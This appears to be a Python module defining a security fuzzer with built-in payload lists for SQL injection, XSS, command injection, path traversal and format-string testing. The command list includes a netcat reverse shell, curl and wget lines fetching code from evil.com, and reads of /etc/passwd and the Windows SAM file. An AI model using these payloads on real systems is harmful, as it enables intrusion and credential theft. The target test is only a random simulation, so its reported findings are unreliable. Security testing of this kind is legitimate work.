from __future__ import annotations
import random
import string
import itertools
import asyncio
import time
from typing import Dict, Any, List, Optional, Iterator
from ..core.task import Task


class Fuzzer(Task):
    """Intelligent fuzzing framework for security testing."""
    
    # Common payload categories
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "' UNION SELECT null, null, null --",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
        "admin'--",
        "' OR 1=1#",
        "' OR 'a'='a",
        "1' OR '1'='1' /*",
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input type=image src=x onerror=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "';alert('XSS');//",
        "\"><script>alert('XSS')</script>",
    ]
    
    COMMAND_PAYLOADS = [
        "; ls -la",
        "&& whoami",
        "| cat /etc/passwd",
        "; cat flag.txt",
        "&& ping -c 1 127.0.0.1",
        "$(whoami)",
        "`id`",
        "; nc -e /bin/sh 127.0.0.1 4444",
        "&& curl http://evil.com/shell.sh | sh",
        "| wget http://evil.com/backdoor",
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "C:\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
        "/var/log/apache2/access.log",
        "/proc/self/environ",
    ]
    
    BUFFER_OVERFLOW_CHARS = [
        "A" * 100,
        "A" * 1000,
        "A" * 10000,
        "%x" * 100,
        "%n" * 50,
        "\x41" * 256,
        "\x90" * 100 + "\xcc" * 4,  # NOP sled + int3
        "\\x41" * 100,
        "AAAA%AAsn0%A",
        "A" * 4096,
    ]
    
    FORMAT_STRING_PAYLOADS = [
        "%x%x%x%x",
        "%s%s%s%s",
        "%n%n%n%n",
        "%08x.%08x.%08x.%08x",
        "%p%p%p%p",
        "AAAA%x.%x.%x.%x",
        "%1000d%n",
        "%s%p%x%d",
        "%4$s",
        "%7$s",
    ]
    
    async def validate_params(self) -> None:
        """Validate Fuzzer parameters."""
        if not self.params.get("target"):
            raise ValueError("target parameter is required")
        
        fuzz_type = self.params.get("type", "generic")
        valid_types = ["sql", "xss", "command", "path_traversal", "buffer_overflow", "format_string", "generic", "custom"]
        
        if fuzz_type not in valid_types:
            raise ValueError(f"Invalid fuzz type: {fuzz_type}. Valid types: {valid_types}")
    
    async def run(self) -> Dict[str, Any]:
        """Execute fuzzing campaign."""
        target = self.params["target"]
        fuzz_type = self.params.get("type", "generic")
        iterations = self.params.get("iterations", 100)
        custom_payloads = self.params.get("custom_payloads", [])
        delay = self.params.get("delay", 0.1)  # Delay between requests
        
        self.logger.info(f"Starting fuzzing campaign against {target}")
        self.logger.info(f"Type: {fuzz_type}, Iterations: {iterations}")
        
        # Generate payloads based on type
        payloads = list(self._generate_payloads(fuzz_type, custom_payloads, iterations))
        
        results = []
        successful_payloads = []
        error_count = 0
        
        for i, payload in enumerate(payloads[:iterations]):
                
            self.logger.debug(f"Testing payload {i+1}: {payload[:50]}...")
            
            try:
                result = await self._test_payload(target, payload, i)
                results.append(result)
                
                # Check for successful exploitation indicators
                if self._is_successful_payload(result):
                    successful_payloads.append({
                        "payload": payload,
                        "result": result,
                        "iteration": i
                    })
                    self.logger.info(f"Potentially successful payload found: {payload[:50]}...")
                
                # Add delay to avoid overwhelming target
                if delay > 0:
                    await asyncio.sleep(delay)
                    
            except Exception as e:
                error_count += 1
                self.logger.warning(f"Error testing payload {i+1}: {e}")
                results.append({
                    "payload": payload,
                    "success": False,
                    "error": str(e),
                    "iteration": i
                })
        
        # Generate analysis
        analysis = self._analyze_results(results, successful_payloads)
        
        self.logger.info(f"Fuzzing completed. Tested {len(results)} payloads, {len(successful_payloads)} potentially successful")
        
        return {
            "target": target,
            "fuzzing_type": fuzz_type,
            "total_payloads": len(results),
            "successful_payloads": len(successful_payloads),
            "error_count": error_count,
            "results": results[:10],  # Include first 10 results
            "successful_exploits": successful_payloads,
            "analysis": analysis,
            "statistics": {
                "success_rate": len(successful_payloads) / len(results) if results else 0,
                "error_rate": error_count / len(results) if results else 0,
                "total_time": len(results) * delay
            }
        }
    
    def _generate_payloads(self, fuzz_type: str, custom_payloads: List[str], max_count: int) -> Iterator[str]:
        """Generate payloads based on fuzzing type."""
        payloads = []
        
        if fuzz_type == "sql":
            payloads.extend(self.SQL_PAYLOADS)
        elif fuzz_type == "xss":
            payloads.extend(self.XSS_PAYLOADS)
        elif fuzz_type == "command":
            payloads.extend(self.COMMAND_PAYLOADS)
        elif fuzz_type == "path_traversal":
            payloads.extend(self.PATH_TRAVERSAL_PAYLOADS)
        elif fuzz_type == "buffer_overflow":
            payloads.extend(self.BUFFER_OVERFLOW_CHARS)
        elif fuzz_type == "format_string":
            payloads.extend(self.FORMAT_STRING_PAYLOADS)
        elif fuzz_type == "custom":
            payloads.extend(custom_payloads)
        else:  # generic
            payloads.extend(self.SQL_PAYLOADS)
            payloads.extend(self.XSS_PAYLOADS[:5])  # Limit for generic
            payloads.extend(self.COMMAND_PAYLOADS[:5])
            payloads.extend(self.PATH_TRAVERSAL_PAYLOADS[:5])
        
        # Add custom payloads regardless of type
        if custom_payloads:
            payloads.extend(custom_payloads)
        
        # Generate random payloads to fill remaining iterations
        while len(payloads) < max_count:
            payloads.append(self._generate_random_payload())
        
        return iter(payloads)
    
    def _generate_random_payload(self) -> str:
        """Generate a random payload."""
        payload_types = [
            lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 100))),
            lambda: ''.join(random.choices(string.printable, k=random.randint(10, 50))),
            lambda: "%" + "".join(random.choices("xspdn", k=random.randint(5, 20))),
            lambda: "<" + "".join(random.choices(string.ascii_letters, k=random.randint(5, 15))) + ">",
            lambda: "".join(chr(random.randint(0, 255)) for _ in range(random.randint(10, 50))),
            lambda: "A" * random.randint(100, 5000),
        ]
        
        return random.choice(payload_types)()
    
    async def _test_payload(self, target: str, payload: str, iteration: int) -> Dict[str, Any]:
        """Test a single payload against the target."""
        # This is a simulation - in a real implementation, this would make HTTP requests,
        # connect to services, or interact with the target system
        
        # Simulate different response types
        response_types = ["success", "error", "timeout", "filtered"]
        response_type = random.choices(
            response_types, 
            weights=[0.05, 0.8, 0.1, 0.05]  # Most payloads will "error"
        )[0]
        
        result = {
            "payload": payload,
            "iteration": iteration,
            "response_type": response_type,
            "timestamp": time.time(),
            "success": response_type == "success"
        }
        
        # Add specific details based on response type
        if response_type == "success":
            result.update({
                "response_code": 200,
                "response_length": random.randint(100, 5000),
                "response_time": random.uniform(0.1, 2.0),
                "indicators": self._get_success_indicators(payload)
            })
        elif response_type == "error":
            result.update({
                "response_code": random.choice([400, 403, 500, 503]),
                "error_message": "Simulated error response",
                "response_time": random.uniform(0.05, 0.5)
            })
        elif response_type == "timeout":
            result.update({
                "response_code": None,
                "error_message": "Request timeout",
                "response_time": 30.0
            })
        else:  # filtered
            result.update({
                "response_code": 403,
                "error_message": "Request blocked by WAF",
                "response_time": random.uniform(0.1, 0.3)
            })
        
        return result
    
    def _get_success_indicators(self, payload: str) -> List[str]:
        """Get indicators that suggest successful exploitation."""
        indicators = []
        
        if "'" in payload or "union" in payload.lower():
            indicators.append("SQL error message detected")
        if "<script>" in payload or "alert(" in payload:
            indicators.append("XSS payload executed")
        if ";" in payload or "&&" in payload:
            indicators.append("Command execution detected")
        if "../" in payload or "..\\" in payload:
            indicators.append("File access detected")
        if "%" in payload and any(c in payload for c in "xspdn"):
            indicators.append("Format string vulnerability")
        if len(payload) > 1000:
            indicators.append("Buffer overflow condition")
        
        return indicators
    
    def _is_successful_payload(self, result: Dict[str, Any]) -> bool:
        """Determine if a payload was potentially successful."""
        # Check for success indicators
        if result.get("success"):
            return True
        
        # Check for specific error patterns that might indicate success
        if result.get("response_code") == 500:  # Internal server error might indicate successful injection
            return True
        
        if result.get("indicators"):
            return True
        
        return False
    
    def _analyze_results(self, results: List[Dict[str, Any]], successful_payloads: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze fuzzing results and provide insights."""
        if not results:
            return {"message": "No results to analyze"}
        
        response_codes = {}
        response_times = []
        payload_types = {"sql": 0, "xss": 0, "command": 0, "path_traversal": 0, "other": 0}
        
        for result in results:
            # Count response codes
            code = result.get("response_code")
            if code:
                response_codes[code] = response_codes.get(code, 0) + 1
            
            # Collect response times
            if result.get("response_time"):
                response_times.append(result["response_time"])
            
            # Categorize payload types
            payload = result.get("payload", "").lower()
            if any(keyword in payload for keyword in ["'", "union", "select"]):
                payload_types["sql"] += 1
            elif any(keyword in payload for keyword in ["<script>", "alert", "onerror"]):
                payload_types["xss"] += 1
            elif any(keyword in payload for keyword in [";", "&&", "|", "$(", "`"]):
                payload_types["command"] += 1
            elif any(keyword in payload for keyword in ["../", "..\\"]):
                payload_types["path_traversal"] += 1
            else:
                payload_types["other"] += 1
        
        analysis = {
            "response_codes": response_codes,
            "payload_categories": payload_types,
            "timing_analysis": {
                "avg_response_time": sum(response_times) / len(response_times) if response_times else 0,
                "max_response_time": max(response_times) if response_times else 0,
                "min_response_time": min(response_times) if response_times else 0
            },
            "vulnerability_assessment": self._assess_vulnerabilities(successful_payloads),
            "recommendations": self._generate_recommendations(results, successful_payloads)
        }
        
        return analysis
    
    def _assess_vulnerabilities(self, successful_payloads: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Assess potential vulnerabilities based on successful payloads."""
        if not successful_payloads:
            return {"status": "No vulnerabilities detected", "confidence": "low"}
        
        vuln_types = []
        for payload_info in successful_payloads:
            payload = payload_info["payload"].lower()
            if any(keyword in payload for keyword in ["'", "union", "select"]):
                vuln_types.append("SQL Injection")
            elif any(keyword in payload for keyword in ["<script>", "alert"]):
                vuln_types.append("Cross-Site Scripting")
            elif any(keyword in payload for keyword in [";", "&&", "|"]):
                vuln_types.append("Command Injection")
            elif any(keyword in payload for keyword in ["../", "..\\"]):
                vuln_types.append("Path Traversal")
        
        unique_vulns = list(set(vuln_types))
        confidence = "high" if len(successful_payloads) > 3 else "medium"
        
        return {
            "potential_vulnerabilities": unique_vulns,
            "confidence": confidence,
            "successful_payload_count": len(successful_payloads)
        }
    
    def _generate_recommendations(self, results: List[Dict[str, Any]], successful_payloads: List[Dict[str, Any]]) -> List[str]:
        """Generate security recommendations based on results."""
        recommendations = []
        
        if successful_payloads:
            recommendations.append("Immediate attention required - potential vulnerabilities detected")
            recommendations.append("Implement input validation and sanitization")
            recommendations.append("Use parameterized queries for database interactions")
            recommendations.append("Implement proper output encoding")
            recommendations.append("Deploy Web Application Firewall (WAF)")
        
        # Check for high error rates
        error_count = sum(1 for r in results if r.get("response_code", 0) >= 500)
        if error_count > len(results) * 0.2:  # More than 20% errors
            recommendations.append("High error rate detected - investigate server stability")
        
        # Check for timing anomalies
        response_times = [r.get("response_time", 0) for r in results if r.get("response_time")]
        if response_times and max(response_times) > 10:
            recommendations.append("Potential timing-based vulnerabilities detected")
        
        return recommendations
